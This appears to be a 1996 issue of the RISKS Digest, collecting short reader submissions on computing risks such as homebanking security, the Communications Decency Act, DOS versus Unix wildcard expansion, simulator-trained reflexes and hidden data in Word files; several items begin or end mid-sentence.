Years, with now over 1.5 million accounts, there was not even one successful
attack!!!!
<P>
Why isn't there any encryption?
<P>
Most of our customers use simple terminals so called "BTX-Decoder". These
terminals do not support any encryption or signature and do not have any
intelligence. A lot of the customers even use hardware-terminals (special
telephones or TV-set-top-boxes) which don't have any possibility to be
updated. We feel, that we don't have the right to exclude all these people
from our homebanking, especially as there never has been any fraud.
<P>
Will there be any improvements in the future?
<P>
Yes there will! For some time we are already working on an new
Homebanking-Standard called "Homebanking Computer Interface (HBCI)" which
will provide a whole bunch of new features, digital signature and
encryption. It will only be usable for PC users (not for users of dump
BTX-terminals), but for those it will really be a fantastic improvement
(especially it is supported be all German banks, so you will be able to use
the homebanking-software of your choice with all German banks).

Security is critical for moving the Internet further into
the mass- and commercial-market. There are multiple choices
for e-mail-based security over the Internet, but they do not
interoperate with each other. MOSS, PGP, and S/MIME each has
supporters and detractors. In general, the constituencies
are not communicating with each other, instead pursuing
their development and deployment independently, promising us
all a future filled with considerable complexity and non-
interoperability. We suffer an excess of riches.
<P>
COMPLEXITY AND NON-INTEROPERABILITY
<P>
The Internet Mail Consortium (IMC) is organizing a one-day
workshop to consider the problem of multiple MIME-based
security mechanisms. This is a complicated topic with a long
and painful history, but the previous pain is insignificant
compared to what is in store for vendors and, worse still,
for users.
<P>
This is an open working meeting intended for e-mail security
principal contributors and others involved in this area. It
will include key contributors and solicit additional
attendance by vendors, providers, users, and technologists
who are knowledgeable about e-mail security and concerned
with its lack of coherence.
<P>
The workshop is not a tutorial. Attendees are assumed
to be familiar with the basics of the three major e-mail
security alternatives. IMC is providing a pre-workshop
discussion list and printed materials at the workshop.
<P>
The attendance goal is to have a critical mass of those with
the technical expertise and industry involvement to review
and debate the requirements, capabilities, and
possibilities. The work goal is to seek common ground for a
common solution.
<P>
While we are not overly hopeful that the end of the day will
see peace and resolve among the masses, we do hope for
improved understanding and some convergence. With luck,
there will even be clarification of the constituencies --
that is, a strengthening of the political base for some of
the alternatives.
<P>
This Workshop is scheduled on the last day of E-Mail
World in San Jose, California and the day before a two-
day ISOC Security conference in San Diego, California.
<P>
AGENDA
<P>
The meeting will be structured with a tight agenda, having a
very focused sequence of work; it is definitely not for
general education. Some amount of review is appropriate, but
not much. The following agenda is tentative and will be
reviewed and modified on the pre-workshop discussion list.

The (Chinese) People's Daily (overseas edition, Feb.15, page.4) relays
a news report of Feb. 14 by the New China News Agency, which announces
that the Chinese Ministry of Public Security (the police) has issued a
regulation that requires any institutions and individuals connecting
or disconnecting to the Internet must register with the local police
authority within 30 days.  Non-registration will lead to penalty.
<P>
The regulation is said to cover all direct and indirect network access
to areas outside China (including Taiwan, Hong Kong, and Macau).  The
report says that as of July of 1995, China has more than 40,000
end-points that are networked [it is unclear if they are all connected
to the Internet or just the domestic networks].  It says that the
regulation is a first important step towards computer security
enforcement, and more regulations are expected.

Article: "GM Plans to Plug Cadillacs into Automatic Communication System"
WSJ, February 9, 1996, Page B3, Column 1
<P>
In summary, GM is introducing a system in its high-end automobiles that will
"automatically call for help" in an accident, including flashing lights and
honking the horn.  Called the OnStar system, it is scheduled to appear as an
option in the 1997 front-wheel-drive Caddies.  According to the article, it
is activated by the air bag being deployed.  In addition to honking and
flashing, the system will transmit (to whom was not clear) the location of
the car in event of accident, theft, or "other emergencies". The system also
includes navigational assistance that works throughout the US, using the car
telephone as the output device.
<P>
OnStar's managing director, Chet Huber, is attributed as saying, "the
company has done extensive market research that says drivers want a greater
sense of security and control." Tying the car into a nationwide
communication system that can track your every move and control your car is
evidently how they intend to accomplish this.
<P>
The RISKS here are numerous, in my mind:
<OL>
<LI>A `false alarm' condition could cause the emergency transmissions,
flashing lights, and honking horns, when there is in fact no emergency.
This is similar to the present risks associated with home alarms.
<P></LI>
<LI>Tracking the location of one's car can be a benefit (prevents you
from getting lost in the Mojave), but it can also allow people to
find you when you don't want them to. Cars have traditionally been
seen as private havens in the US.
<P></LI>
<LI>The system could give wrong navigational information to the driver.
Who will be verifying the nationwide database of road information?
The driver could follow the system's recommendations and become lost.
Come to think of it, I guess that's an argument for having item 2.

<P>
Recently, the Associated Press newswire triggered another round of
ridiculous computer virus alarms with a story on the Boza/Bizatch
computer virus, an admittedly barely infectious parasite on Win95
executables.  Attributed to the VLAD Australian virus-writing group,
due to the equivalent of a computer underground press release embedded
in the virus extolling VLAD members and their technical virtuosity
vis-a-vis writing them, Associated Press reporter Sue Leeman
issued a news brief and it echoed internationally.
<P>
In a pattern of action and reaction that has become standard for
many computer virus stories reported in the mainstream press, the
Boza piece generated countless questions from on-line users who thought
they were in danger from it, although realistically they were
statistically more likely to be hit by an automobile than the virus in
their lifetime.  The original Associated Press attributed Sophos' Paul
Ducklin saying the Boza virus wasn't on the loose, but most subsequent
news stories and fragments derived from it, including copycat
press releases from other vendors, stripped this from the original.
The Associated Press story wound up being printed in toto or in
fragments in countless newspapers around the country that subscribe
to the newswire.
<P>
A good example, but only one of many, was a prominently displayed bulletin
mounted on the Compuserve "What's New" public announcement board.  This
board is displayed to callers everyday and it contained a warning about the
Boza virus and a tip to head to Thunderbyte Anti-virus's spot on the service
for a cure.  However, the fact that the virus wasn't in circulation or even
likely to be so, while present in the original seed AP piece, was gone.
<P>
The results were predictably confusing.  Some PC users on Compuserve who did
not even have Windows 95 installed on machines concluded they might have
been exposed to Boza. I noted similar results on other networks like FIDO
and in Usenet newsgroups.
<P>
The Boza mini-panic, coming as it does close to the Michelangelo virus
anniversary on March 6, illustrated the need for consistent media criticism,
particularly when it comes to certain varieties of technology stories, like
those dealing with computer viruses.  A few rules of thumb to keep in mind
when dealing with this type of thing are:
<OL>
<LI>Computer virus stories are the best vehicle in which software developers
selling cures can pimp for their products. Even if the virus is shown to be
pathetic as a public menace, interest in those cited will always peak
transiently during the run of the story. This amounts to software sales and
on-line time spent through commercial services offering information or
software fixes through download, even if it's unnecessary.
<P></LI>
<LI>Being the first vendor mentioned in a story like Boza throws competitors
immediately on the defensive, scrambling to recover and fueling the story in
the process.  Even though competing companies may have known of a virus
weeks previously and quietly written cures into software as the usual course
of business, the average PC user - after reading this type of story - is
given the impression everyone else was asleep at the wheel.  This sets off a
chain reaction in which competitors quickly release copycat press releases
which drive developments and strip more information from the primary seed in
an effort to maximize exposure. Those vendors who don't do this often face
tons of witless support questions from those needlessly frightened by the
news in on-line computer help forums. They also face a transient image that
they've been caught flat-footed by competing vendors who've been more
successful at generating publicity. From a consumer standpoint, this leads
to counter-productive behavior in which some vendors, burned by the lack of
exposure, gear up to generate even more press releases on potential future
threats _before_ they materialize.
<P></LI>
<LI>It encourages some vendors to increase their contact with known active
virus-writers and their groupies so that they will be the first to receive
new viruses which, may or may not (more often "not"), work.  This is a nasty
spiral which tends to encourage virus-writers to produce more than they
usually would for their "audience." Having written a book on virus-writers,
I've seen this happen more than a few times since 1992.

<P>
A company I'm working at has had a lot of growth recently on their WWW proxy
servers.  Last Friday evening I was finishing business just as a memo
started its rounds...  It seems that on a given day in January when they
monitored the system, 1100+ connections to ESPNet were made, 800+ to
Playboy, 600+ to Penthouse, etc...
<P>
It seems that now that they "have the new proxy servers in place which are
able to log all transactions by source and destination address", they are
going to start logging all "inappropriate" accesses with source destination
IP address and send the appropriate log extracts to the persons boss.
<P>
The RISKS?
Who says that an IP address maps to a person?
"Click here to see technical specs on the XYZ Widgitifier" (points to
Penthouse -- haha, fooled 'ya)
I run a caching proxy server to increase my workgroups performance and
reduce load on the company T1 and T3 lines.  It's not really an
official resource (in that the guys sending out this list don't
know about it), so it looks like I spend a LOT of time browsing :-)
Have someone you don't exactly like who's machine is turned off?  Maybe
they didn't get to the PC today.  Maybe you just install a redirector
on their machine...  My NNTP redirector took about an hour to write.
Did anyone actually believe their connections that were going through a
central proxy were NOT being logged?  Perhaps I've just run a proxy
site for too long...
<P>
I'm sure there will be thoughts of "invasion of privacy", but (a) there are
notices posted all over that personal use of company equipment is a no-no,
and (b) this is a "regulated" industry -- you'd actually be using TAX
dollars to do your web browsing.  The company can get it BIG trouble for
NOT doing everything they can to prevent it from happening.
<P>
It's a trend I see coming...

<P>
FLASH: Federal Court Enjoins Internet "Indecency" Provision --
ACLU, EPIC, and Others Score Partial Victory in CDA Challenge
<P>
A federal judge in Philadelphia has issued a partial temporary restraining
order prohibiting enforcement of the "indecency" provision of the
Communications Decency Act (CDA).  The judge declined to enjoin those
provisions of the Act dealing with "patently offensive" communications.
<P>
The court agreed with the plaintiffs' claim that the CDA will have a
chilling effect on free speech on the Internet and found that the CDA raises
"serious, substantial, difficult and doubtful questions."  The court further
agreed that the CDA is "unconstitutionally vague" as to the prosecution for
indecency.  But the court left open the possibility that the government
could prosecute under the "patently offensive" provisions
<P>
The court has recognized the critical problem with the CDA, which is the
attempt to apply the indecency standard to on-line communications.
Nonetheless, online speech remains at risk because of the sweeping nature of
the CDA.
<P>
The entry of the court order is a strong indication that the "indecency"
provision of the legislation that went into effect on February 8 will not
survive constitutional scrutiny by a three- judge panel that has been
empaneled in Philadelphia.  The panel will fully evaluate the constitutional
validity of the legislation and consider entry of a permanent injunction
against enforcement of the new law.
<P>
The temporary restraining order (TRO) was issued in a lawsuit filed by the
Electronic Privacy Information Center (EPIC), the American Civil Liberties
Union and a broad coalition of organizations.  EPIC is also participating as
co-counsel in the litigation.
<P>
The court ruling comes in the wake of widespread denunciation of the CDA,
which was included in the telecommunications reform bill signed into law
last week.
<P>
According to EPIC Legal Counsel David Sobel, one of the attorneys
representing the coalition, "The court's decision is a partial victory for
free speech, but expression on the Internet remains at risk.  This is
destined to become a landmark case that will determine the future of the
Internet."  Looking ahead to proceedings before the three-judge panel, Sobel
said "we are optimistic that further litigation of this case will
demonstrate to the court that the CDA, in its entirety, does not pass
constitutional muster."
<P>
EPIC has maintained since its introduction in Congress that the ban on
"indecent" and "patently offensive" electronic speech is a clear violation
of the free speech and privacy rights of millions of Internet users.

support of the TRO, is available at:

Due to a mis-paste [mis-spaced!], I gave out misinformation on who voted
against the CDA in my recent article. The correct version is:
<P>
Earl Hilliard (D-AL), Pete Stark (D-CA), Pat Schroeder (D-CO), Neil
Abercrombie (D-HI), Lane Evans (D-IL), Sidney Yates (D-IL), Barney Frank
(D-MA), John Conyers (D-MI), Collin Peterson (D-MN), Harold Volkmer (D-MO),
Pat Williams (D-MT), Maurice Hinchey (D-NY), Jerrold Nadler (D-NY), Peter
DeFazio (D-OR), Timothy Johnson (D-SD), Bernard Sanders (independent-VT)
<P>
Senators
<P>
Dianne Feinstein (D-CA), Patrick Leahy (D-VT), Paul Simon (D-IL), Paul
Wellstone (D-MN), Russ Feingold (D-WI), and John McCain (R-AZ).
<P>
[As you'll note, the string "MN), Russ Feingold (D-" was some how left
out, leaving out Feingold, and making it look as if Wellstone is D-WI!
Many apologies for the error.  SMcC]  [Yes, it was also mis-spaced.  PGN]

[Stanton's message in <A HREF="/Risks/17.74.html">RISKS-17.74</A> was too polemic and slanted for some
readers, who wondered about why I included it in RISKS.  I had a similar
reaction, but chose to include it anyway rather than try to censor it
(!) -- because I had not seen any other appropriate submissions on this
subject and felt that the subject itself was without doubt worthy of
mention in RISKS.  Had I written the analysis myself, it would have been
quite different, but I try to keep RISKS as open a forum as possible
within the posted guidelines, and very seldom try to edit for content --
apart from adding interstitial notes such as this one.  PGN]

What we have in the CDA as has been said by many before is the consequence
of non-technical people making decisions on technology without technical
information.  The internet itself is a complex technological system, but the
content the CDA seeks to regulate is easily understood, with even the
quickest training (i.e. Look, Senator, if you click here you get the Mona
Lisa, but if you click here, you get the Moaning Lisa).  It seems that our
elected officials are too busy even for this brief glimpse.
<P>
What many people have overlooked is a simple effective solution that almost
everyone uses - passwords.  While simple password protection is not enough
to ward off a "high-tech" attack, it is usually enough to discourage your
teenager from delving into the sometimes objectionable world of alt.*.* and
some of those chat groups.  I have an on-line service account on one of the
major services, and at least once a week, my teenage son and I "surf the
net" - the 1996 equivalent of "watch TV with your children".  My son does
not know my online password and I change it regularly.  Can he defeat this
code?  Sure, but he can walk down to the corner store and pick up any one of
a dozen "objectionable" publications much easier.  This seems to me an
acceptable risk.  He has learned to be a responsible online citizen.  I feel
that I have handled the risk that the CDA sought to eliminate.

<P>
Over twenty years ago, Congress passed a resolution that required automobile
manufacturers to restrict use of automobiles unless seatbelts were fastened
and the seatbelt interlocks of 1974 ensued.  Such a public outcry ensued
that the requirement was removed in time for the next year's models.
Fortunately for those with '74s (not a great year for cars in general)
unplugging a single connection on each front seat disabled the mechanism.
In its wake, a more rational system followed with a dashboard warning light
and state laws mandating seat belt use to take the onus of compliance from
the manufacturers, and placing it on the users of the automobiles in states
where prodding was felt appropriate.
<P>
I predict a similar fate for the CDA: the US Gov getting out of the conflict,
removing the onus from the service providers, while placing the bulk of the
responsibility back onto users/parents and permitting definition of
community standards *within the communities* and not for the entire net.
<P>
To accomplish this, some control mechanism is needed -- but, like the
warning light on the dashboard, a flag could be placed on sites containing
potentially offensive material, a flag for which the software vendors could
provide a "parental control" switch. Not difficult to do just not done, yet.
<P>
In Florida, a parent is held responsible if a child gains access to a gun.
Similarly only an adult can purchase a firearm and must show "proof of age".
<P>
Along the way we are going to need some sort of Internet "proof of age" - in
the form of a cryptographic ID in which some agency verifies that the holder
is of legal age in the state of residence. True, there will be screams from
the rabid right but is necessary like a drivers license - you do not have to
have one, but if you want to drive a car... Also suspect that since states
have different ideas about what constitutes an adult, the mechanism should
be driven by the states and not the federal government - this would again
defuse many objections.
<P>
This prevents the customs peculiar to New York City from affecting the
different cultures of Florida or Texas.
<P>
Similarly we need to prevent local mores of Memphis from affecting what
works in San Francisco. (I suspect that some public health warnings I have
seen on SF buses might be illegal in Memphis.)
<P>
I do expect good to come from the CDA in that the Supreme Court will have
the opportunity to say "STOP THAT" to some of the more radical elements. It
seems that in some things we must go overboard just to verify that we do not
ever want to do that again. Somehow it works 8*).

I've never written a program for Windows, but my dimly remembered experience
with MS-DOS indicates that programs get the raw command line parameters, and
it's up to the program to expand the wildcards according to the rules.  It's
not surprising that sooner or later someone would get it wrong on one
command or another.
<P>
In contrast, the Unix shell handles the wildcard expansion, and programs
only see the expanded parameter list.  Of course, there are risks here, too,
since there are multiple shells available, each with slightly different
wildcard rules.

There are some quaint ideas in "the measurement of risk" by <A HREF="mailto:tada@MIT.EDU">tada@MIT.EDU</A>
- I got a good laugh out of the comment about priorities on health spending:
<P>
The following type of example should be borne in mind when comparing safety
propaganda and safety spending with "common sense solutions": Asthma is
generally reckoned to be a disease caused by vehicle pollution: In the UK
last year 4m pounds was spent on asthma research 6m pounds was spent on
POLICING demonstrations against the proposed new M11 road.
<P>
The real RISK is that someone like <A HREF="mailto:tada@MIT.EDU">tada@MIT.EDU</A> works for the risk assessor
who decides whether your local hospital stays open! - tada forgets that when
the individual decides whether to spend all of his or her income on health,
the taxman grabs the Star Wars, the road, the import surcharge/export
subsidy and the MP/congressmen's salary increases before minor problems like
literacy in the local secondary schools are even debated. I am afraid that
example stopped me so dead in my tracks, I was unable to focus on a line of
the remaining eMail, so there's a risk of making statements of "obvious
facts" early on in a technical presentation.
<P>
I should think that the size of the drug problem in our two countries
demonstrates that quite a large chunk of the population have no respect
whatsoever for their personal safety, although I am sure their
representatives in congress/the Commons think they have.
<P>
As for Telstra's radio emissions, well, I suppose the main problem is that
the last time the electorate read about something with the string "radio" in
it, it was the technical world telling them that radioactivity was good for
you, so it's more a case of "once bitten, twice shy" than "Us vs. Them".

It seems to me that if we take credit for the good habits developed while
training in VR, we have to consider that bad habits can be developed there
too.  As habits are developed through repetition it seems reasonable that
compulsive video-gamers would be much more susceptible to such a phenomenon.

This is related to a more generic risk relating to trained reflexes.  I once
heard an airline pilot give a talk where he said that he always has his wife
drive him home from the airport when he is done flying for the day.  The
reason for this was that when a plane is on the ground, the rudder controls
(which are foot pedals) are used for steering, and the "steering wheel" of
the plane is not used at all. This pilot said that on more than one occasion
he came close to having an accident in his car because he instinctively
tried to steer with his feet.

Sad to admit, this has almost happened to me already.  My institution of
higher education got an SGI Power Challenge a couple of years ago.  Lovely
machine, which includes a very good flight simulator/dogfight game.  A
couple of times, driving home after 4 hour sessions, I found myself
reflexively flooring the gas pedal, crossing three lanes of traffic, and
cutting in front of a car: there was "obviously" room, as my
simulator-trained perceptions would have it.  I no longer play that game.

This risk has already happened.  A few years ago one of the branches of of
the US Military created computerized training material using video, computer
graphics overlays, and a touch screen to train technicians how to repair a
piece of radio equipment.  The actual equipment was shown by video and a
"fault" generated with the graphical overlay.  The student would then
"touch" (using the touch screen) a part to test or remove.  The training
software was changed and the touch screen removed after a number of
graduates were injured (shocked/burned) while touching the real (live) radio.

The 16 Feb 1996 edition of the *Baltimore Sun* announces that a computer
program similar to one used to attribute unknown poems to William
Shakespeare has been turned to solving the mystery of who wrote the
best-selling book, *Primary Colors*.  The work was apparently done by Donald
Foster a professor at Vassar College who discovered that both Joe Klein and
the author of *Primary Colors* used these adjectives quite often:
<P>
especially, entirely, fiercely, incredibly, mortally, particularly,
precisely, profoundly, reflexively, relentlessly, seriously, subtly,
surprisingly, ultimately, utterly, vaguely, wistfully
<P>
More information will be published in an article slated to run in the copy
of *New York* magazine that goes on sale on Monday. This article seems to be
the major source for the *Sun* piece.
<P>
If Joe Klein, a well-known political writer, is indeed the author, it is
clear that he didn't learn one of the first lessons of Washington.  If
you're going to leak information or quotes to the world, make sure you use

Intuit Inc. has for the second year in a row delivered buggy versions of its
tax-preparation software, TurboTax and MacInTax -- which can give wrong
entries in cases involving depreciation of cars and real estate,
self-employed taxpayers, and IRA contributions (expected to affect at most 1
percent of their users -- 20,000 out of about 2 million).  Intuit is
offering free updates of the software, and help in workarounds for the old
software.  Intuit also offered to pay any resulting penalties and interest
charges.  [PGN Abstracting.  Source: Intuit Finds Errors In Its Tax

Today's Federal Register contains a notice from the Department of State,
Bureau of Political Military Affairs, announcing final rule of an amendment
to the International Traffic in Arms Regulation (ITAR) allowing U.S. persons
to temporarily export cryptographic products for personal use without the
need for an export license.  The product must not be intended for copying,
demonstration, marketing, sale, re-export, or transfer of ownership or
control.  It must remain in the possession of the exporting person, which
includes being locked in a hotel room or safe.  While in transit, it must be
with the person's accompanying baggage.  Exports to certain countries are
prohibited -- currently Cuba, Iran, Iraq, Libya, North Korea, Sudan, and
Syria.  The exporter must maintain records of each temporary export for five
years.  See Federal Register, Vol. 61, No. 33, Friday, February 16, 1996,

Wireless Bidder's Inadvertent Zero Could Cost It Millions
<P>
...during still ongoing bidding for wireless telephone licenses at
the Federal Communications Commission in the District, a Puerto Rican
company, PCS 2000 L.P., mistakenly placed a bid totally $180 million
for a small market that includes Norfolk and Newport News, Va.
The bidder meant to tap $18 million into the computerized bidding
form, but "it is obvious that an extra zero was somehow accidentally
added to the end of the bid amount," PCS 2000 official said in a letter
to the FCC.
...The FCC imposes tough penalties on those who withdraw bids, to guard
against bidders running up the price of a license and then pulling out.
Typically, bidders who withdraw must pay the difference between their
aborted bid and the amount of money that the license actually sells for.
...What baffles FCC officials is that PCS 2000 didn't catch the error.
The computerized bidding system gives contestants three opportunities to
confirm their bid, followed by a final chance to get a paper printout.
PCS 2000 blamed time pressure: It has been among the most active bidders
for the licenses, competing in more than 48 markets in each round.
Such typos have occurred three times before, amid the thousands of
bids processed by the FCC since it began auctions in late 1994.  The
largest error was by a company called Atlanta Trunking, which recently
bid $225 million, instead of $225,000, for a radio dispatch license.
<P>
The reference to "three opportunities to confirm their bid" leaves open the
question of whether the operator is asked to reenter the number or if it's
merely displayed for visual checks several times.  The chief of the FCC's
auctions division also notes that training seminars and walk-throughs of
the process were conducted for the bidders.  As of the article's writing,
neither firm had been penalized yet, pending consideration of their appeals.
<P>
The reporter did not attempt to address the possibility of a breakdown in
the bidder's own communications system between any decision-making authority
and the agent who actually enters the bid.

Internet to circulate a hearsay allegation that a daughter in the family was
being mistreated by her mother.  Posting his message on Internet newsgroups
concerned with child welfare, psychology, left-wing politics, and civil

The main provision in the CDA is the prohibition of individuals from
"TRANSMITTING" offensive material to other people. In chat rooms it is true
that you transmit material; in other words, you type something and it is
transmitted to all of the computers logged into that chat room; however,
when material is placed on WEB pages, nothing is transmitted, somebody has
to physically search for it and view or download it. This is receiving, not
transmitting.

I know this is semantics at this point; but, just because you have an adult

<P>
This is presumably because DEL and DIR do their own filename globbing,
rather than relying on a system function to do it for them. I find this
highly entertaining, since one of the planks of the Unix-Haters argument has
always been that having the shell do globbing (i.e. all the globbing is in
one place) is Evil and Wrong.

As George Kaplan correctly points out, console programs are responsible for
carrying out wildcard expansion (i.e. not the shell).  However, if memory
serves correctly, convention dictates that Windoze programmers use wildcard
expansion library routines that behave in a standardized manner. Unless you
enjoy reinventing the wheel and have written your own wildcard expansion
routines, every console program should expand wildcards in exactly the same
way. Therefore something must be *seriously* screwed up if "dir" and "del"
aren't behaving as expected. Brain dead OS coding (what else is new?).

Exactly this Unix feature has produced a new variant of the wildcard
inconsistency: as a program does only see the expanded parameter list, it
does not know whether a wildcard string was involved (and if so, which one).
Hence, depending on the options specified, the Unix ls command (the
equivalent of the DOS dir command) lists more files than the rm command (the
Unix equivalent for the DOS del command) would remove on account of the same
wild- card string. Example:
ls -lg x*
would not only list all files in the current directory whose names start with
an "x", but also all files in any directory whose name starts with an "x".
<P>
Sure enough, this is quite better than listing less files than would be
deleted, but I still find it disturbing.
<P>
In VM/CMS, the program gets the wildcard string, and it can use a central
routine (LISTFILE) to expand this string. I think, this is the best solution.

<P>
George Kaplan comments that the Unix shell handles wildcard expansion,
whereas DOS and Windows programs receive their parameters as typed into the
command line, and are left up to their own measures to expand them.
<P>
While this is true, there is a standard method for expanding wildcards - the
"findfirstfile/findnextfile" functions.  (Under DOS and Win16,
_dos_find_first and _dos_find_next; under Win32, FindFirstFile and<BR>
FindNextFile).  Where these commands are used, a uniform expansion of
wildcards can be achieved.
<P>
There are two reasons that I can see for using a different behaviour, each
with their own attendant risks:
<OL>
<LI>A lack of education about the appropriate commands, leading people to
make their own solutions from more basic functions.  Lack of appropriate
knowledge usually leads to late delivery dates, slow and bloated software,
and often more mistakes - the more code you have to write yourself, the more
chances you have of making a mistake.
<P></LI>
<LI>A decision to change the interface 'for the better'.  As noted below, the
wildcard expansion has changed in some ways that might be beneficial - it
seems this only applies to some commands, though.  The risk here - people
are used to the original interface, and make assumptions based on that
knowledge.  One of the hardest tasks for a Win3.1 user upgrading to Win95 is
to forget many things they learned under Windows 3.1.  Frequently this
"knowledge" hampers their use of the new features of Win95.
</LI></OL>
Mr Kaplan might be intrigued, for instance, to note that in a DOS window
under Win95, he can place an asterisk in the wildcard _before_ other
characters, for example "DIR *MEMORY.H", which will list "VMEMORY.H" and
other similar names.
<P>
In previous DOS versions, the presence of an asterisk was converted inside
the BIOS to a series of question marks, as in my example, which would
effectively become "DIR ????????.H" - obviously, for this to work as
intended, a question mark must match an absent character in the file name,
hence the behaviour noted in the original article where "DEL XX?" deletes
both "XXX" AND "XX".  Note that this expansion of the asterisk continues for
eight characters - old DOS files are stored with eight characters of name,
and three of extension.
<P>
The conundrum presents itself under Windows 95 with the dual nature of a
filename.  Each filename has a short and long version - when referencing the
long version of the filename, it would be infeasible to represent an
asterisk as a series of question marks to the point between the name and
extension, since that position is no longer fixed - the name AND the
extension may be arbitrary length; indeed, it is only by a stated convention
that the extension is the last sequence of non-period characters following a
period (if no period, there is no extension).  So, the question mark is no
longer forced to have one interpretation.
<P>
Experimentation shows that the DIR command seems to be the odd-man-out in
Win95, since "EDIT XX?" pulls both files into the editor, for example.  In
the particular example given, "DIR XX?." (note the period) will list both
files.  Also, the assumption that the DIR command will list all files that
would be deleted by the DEL command, when given similar parameters, can be
proven wrong - simply try a file "XXX.TXT", and type "DIR XXX", followed by
"DEL XXX" - the directory listing will show the file, whereas the delete
will complain "File not found".

<P>
This difference between MS-DOS and UNIX is a cause of frequent complaint
from UNIX users.  However, there are technical differences between the two
solutions-The UNIX approach requires the ability to pass extremely long
command lines to the invoked commands, whereas MS-DOS is limited (for good
reason initially, given the hardware limitations) to about 128 bytes.
<P>
The first version of UNIX I used (circa 1975) limited command lines to about
51-bytes -- that made the UNIX approach almost useless, because so many<BR>
useful expansions required command lines longer than this.  It was soon
expanded to about 5120 bytes - much better, but still not sufficient on
occasion.
<P>
There is also a significant effect on the user interface.  In MS-DOS, a
command like "copy A*.* B*.*" has the effect of copying a bunch of files,
renaming them all consistently.  A command like this is not possible in
UNIX, without requiring awkward escapes, etc., because the invoked program
never sees the original form of the parameters, to make the appropriate
substitutions in file names.  Whether one likes this or not is a matter of
taste, but I think a good argument can be made that the capability is
useful.
<P>
I am generally hard-pressed to find good words about MS-DOS, but I don't
think it is completely evil :-) (I don't know if there is a RISK here,
except perhaps to note again that problems can be trickier than they first
appear.)

The recent discussion in RISKS about wildcard expansion lead me to think of
another security risk in Unix wildcard expansion. If I were to do a "sz
*.zip", someone doing a "ps -aux" on my system would see the list of files<BR>
expanded. This could lead to some misunderstandings over what someone was
downloading (how often have you had the wrong impression from a filename?).
<P>
As well, on a similar topic, my pppd (runs my Linux PPP connections)
normally gets the logon and password passed on the command line, causing it
to be displayed on a "ps -aux". I realized this, and after doing some
researching, discovered I could pass the p/w from a file instead (which
could be 400 root-owned).

TOPS-20 (do I date myself?) was halfway between the UNIX and the Windows '95
approach -- it had a JSYS (system call) that would do the expansion, if my
memory serves me correctly. So the program determined if wildcard expansion
occurred, and if so, all programs would expand the wildcard in the same way,
by issuing the appropriate system call.
<P>
I last used TOPS-20 in 1979, so my memory of the exact JSYS used is really
shaky.  It was a very nice system ...

The commonest VMS command shell, DCL, doesn't expand wildcards either, but
VMS provides runtimes for that, and virtually all programs use these.  This
also applies to command procedures, since the runtimes are accessible at the
shell level.  The result is that wildcarding is very consistent under VMS,
even though wildcards aren't expanded by the shell.
<P>
I gather this isn't the situation under DOS.  Imagine my surprise.

<P>
&gt;... military aviators were not allowed to operate real aircraft for some
&gt; interval after using a VR simulator.
<P>
But for a totally different reason. Simulators have become, on the one hand,
very similar to reality in the visual domain, but have obvious limitations
when it comes to simulating movement. (If you integrate all the
accelerations your simulated plane seems to be doing, you end up traveling
the distance the plane would be doing if it were actually flying, which is a
tad bothersome for a stationary simulator...) Thus, that part of your inner
ear that measures acceleration is only briefly stimulated by the start of a
movement in the simulator; the rest is done visually, which works because
the visual system, having acquired extensive real-world experience, is
capable of generating the same sensations as real accelerations (ever seen
the IMAX versions of those nice JPL-produced Venus and Mars flyovers?).
However, your neural system is capable of learning, and quickly at that: In
a flight simulator, and especially a military one where manoeuvers are much
more extreme than for a civilian craft, the pilot learns within an hour to
associate visual movement with only very little input from the inner ear.
When he next happens to accelerate in the real world (and it reportedly has
happened just quickly walking down a stair after the simulator session) his
system revolts 8-) because of the cognitive dissonance caused by conflicting
actual input and experience. Not a good idea at Mach 0.8 and 50 meters above
the tree tops... Fortunately, one un-learns (or, rather re-learns) within a
day or two.

It struck me after reading the article that 'Realistic virtuality' may be a

<P>
I think the risks as listed by Cohen are obvious, but is not so obvious is
the perception that 'virtual reality' is in some way linked to 'reality'. It
gives the illusion of being 'real' in that it is realistic but it is only
virtual and the virtual world is at the whim of the creator of that world.

Having grown up in the 80's and still being a somewhat avid video gamer, I
can attest to both the advantages and risks of habits gained in VR-like
situations. It is common for me to drive 30 miles to my home after an
intense hour long multi-player DESCENT(*) session, during which, my nerves
are *still* on alert from the game.  At these times, I am more alert and
aware of my surroundings, however, my Jeep doesn't have the ability to fire
homing missiles and take off vertically at mach-3.
<P>
I think the overall result, though, is that after being in VR-like (or
traditional video game) situations, the individual winds up with better
motion-perception ability.  I think this sticks while the learned reactions
(fire the homing missiles, Gunner!) are left in the fantasy world.

(*) DESCENT for those of you who do not know is a single or multi-player 3-D
shoot-em-up, where you pilot a spacecraft within the shafts of deep-space
mines.  You have a plethora of weaponry available to you, and-- in
multi-player mode-- it gives you the opportunity to blast your co-workers to
space dust.  More information can be found at <A HREF="http://www.idsoftware.com">http://www.idsoftware.com</A>

I'm only a few miles from yesterday's wreck.  The known facts to date:
<P>
The Amtrak was ""passing"" a stopped freight by crossing over to the
other track, then crossing back. For whatever reason, the inbound
MARC had NOT stopped [short of the 2nd crossover], &amp; the two
passenger trains collided head-on.
<P>
This is EXACTLY the worst case accident scenario railroad signal
systems &amp; procedures have been designed to prevent; designed so for
many decades. [When WAS the first RR block signal installed?]
<P>
Yet it happened anyhow.....
<P>
The RISK? Whether despite, or because, or coincidental to CSX's
centralized dispatch &amp; track management system; or the weather, or
human error; sometimes, alas, old Risks cannot be eliminated, only
constrained one day at a time.....

<P>
Recently I was asked to type up a resume for a friend and provide both a
hard copy and a copy on disk.  I typed it up using Microsoft Word.
<P>
Before I gave her the final copy, I wanted to double-check one piece of
information.  Since I didn't want to wait forever while Word came up, I sent
it to a simple text editor.  I was shocked to find that buried among the
text and code were several URLs that I had visited while cruising the Web!
One of the addresses included my username and password for a foreign
electronic paper that I subscribe to, and one, to my embarrassment, was
<A HREF="http://www.whitehouse.gov">http://www.whitehouse.gov</A>..  &lt;Blush&gt; None of them showed up when viewed with
Word, and if I hadn't checked it with the text editor, I wouldn't have known
they were there.  Fortunately, it was no big deal, but the security and
privacy risks are obvious.
<P>
I have no clue how they ended up embedded in my Word document.  I don't use
Microsoft Assistant for Word (or whatever it's called).  The only other
thing I can think of is that I was cruising the Web at the same time I had
the document open and somehow they ended up there.  Nonetheless, you can bet
I will be checking all my Word documents with a text editor before sending
them out to anyone!

I've noticed that if my DOS prompt icon in Windows '95 is "depressed" on the
taskbar, but not in the foreground, and I have screen savers disabled in its
properties, the screen saver will not come up. This could be a security
risk: If I have my screen saver password protected, and the desktop is
showing, I would assume (and did assume) that my screen saver will come up.
I wonder if this is a "feature" in that as long as the item is selected on
